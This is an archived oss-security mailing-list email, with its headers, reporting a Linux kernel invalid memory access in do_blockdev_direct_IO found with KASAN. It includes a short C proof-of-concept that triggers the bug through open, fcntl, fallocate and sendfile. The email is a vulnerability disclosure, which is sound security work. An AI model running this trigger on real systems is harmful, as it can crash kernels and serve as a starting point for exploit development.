X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1007" "Tuesday" "11" "October" "2016" "22:22:48" "+0800" "Marco Grassi" "marco.gra@gmail.com" "<CAFkTriL_sGQ=0ym3ALDXjWMYNJxKC3UH02Lx7v9Zj_CsX9NOiA@mail.gmail.com>" "45" "[oss-security] linux kernel do_blockdev_direct_IO invalid memory access" nil nil nil "10" "2016101114:22:48" "[oss-security] linux kernel do_blockdev_direct_IO invalid memory access" (number mark "U       marco.gra@gm Oct 11   45/1007  " thread-indent "\"[oss-security] linux kernel do_blockdev_direct_IO invalid memory access\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30152 invoked by uid 550); 11 Oct 2016 14:23:03 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30091 invoked from network); 11 Oct 2016 14:23:01 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=hlkHcWMTZrzgkdNpttK8dZppjRIlugR0q2qUZaLx3ZM=;
        b=CKRqPJZazp7KionuzhzCRIhWqW4W5R8/fgEUgvgJWY+gIbnHrzrnKz4fZSxAyZ3tE5
         mPLkPiGtpIdfw9UtomR9iTzqRKr3MUlWRH2qMwfi5IMR/3xdiZ0I3TWVYhG0dV/M61d4
         lnyOFi+Yml5Xh61j7pdvjZv8AFsFtK9xIs5xxOGl7lxu7KexxIwDWKw9KPPrAObMZKkN
         duFBLHJlsFdQHZMI2JGhfrJxdc/zuUqhg2c04pGUQL9kDPKSrpdEOxPjezSDks+FdPJo
         KwbVz5c+td/ecdPLcrylbDFQiBF+u+pdjrhEvSXWY6ja8i+y2NMoPcCIwP7rkSDQ4h6T
         mtEA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=hlkHcWMTZrzgkdNpttK8dZppjRIlugR0q2qUZaLx3ZM=;
        b=e2RnY5NTmbg+eCjpBK7PFrOTuH7QkGChfmAmigMGQB6WNsNbT0E8llw8KTHHX8BirY
         J9+wogSDUjyFIvIqK1cA7BTMdGmbNUOng4dHsCCXVtedt+mJuIAQI+sSmcZ7Ky+ssL72
         SsR3hqzrQycib4xiypl+evnIOTVD9a487UCi0X+E2haC2JIAPU3Qd8Mc05pvnjzSRMr9
         iG6qoipF54G+S1SNRp2pWAeH92Rr27Kz8N8BTIclst/VFARZUh8Cd8l8jD8p5+Bd5i5+
         6rix2jhpDyLvIYuhcP0suSxA9lYywOH84AOJQfmxkfVdoFhDFhh43PodiIeLFG25mrVn
         ok0g==
X-Gm-Message-State: AA6/9RnDj36K3My9LNYOY852nOFfy3679ZJkeC2YdxHgv+bzV8dYj4VmzIvb+i1kOfno8JCLIX6NOFxT3Xbc5A==
X-Received: by 10.36.46.4 with SMTP id i4mr18130402ita.27.1476195768938; Tue,
 11 Oct 2016 07:22:48 -0700 (PDT)
MIME-Version: 1.0
From: Marco Grassi <marco.gra@gmail.com>
Date: Tue, 11 Oct 2016 22:22:48 +0800
Message-ID: <CAFkTriL_sGQ=0ym3ALDXjWMYNJxKC3UH02Lx7v9Zj_CsX9NOiA@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: cve-assign@mitre.org
Content-Type: multipart/alternative; boundary=001a114aa3746e078a053e979c77
Subject: [oss-security] linux kernel do_blockdev_direct_IO invalid memory access

--001a114aa3746e078a053e979c77
Content-Type: text/plain; charset=UTF-8

Hello,

I posted this to ask feedback on security at kernel dot org, but I think my
mail got bounced back. Not sure if from the mailing list or from some
single recipient.

Anyway reposting here,

the following program will cause a invalid memory access

BUG: KASAN: wild-memory-access on address 0005080000000000

See this link for the full sanitizer report, stacktrace and trigger poc

https://gist.github.com/marcograss/40850adb3c599ac38e0beac31617d56b

tested on current master, with KASAN.

Marco

---

#include <sys/syscall.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/sendfile.h>

int main()
{
  int ret = 0;
  int fd = open("./hurrdurr", O_APPEND|O_RDWR|0x40);
  ret = fcntl(fd, 4, 0x44000, 0, 0, 0);
  ret = fallocate(fd, 0, 0x21, 0xafa6);
  off_t offset = 0;
  ret = sendfile(fd, fd, &offset, 0x800);
  return 0;
}

--001a114aa3746e078a053e979c77--
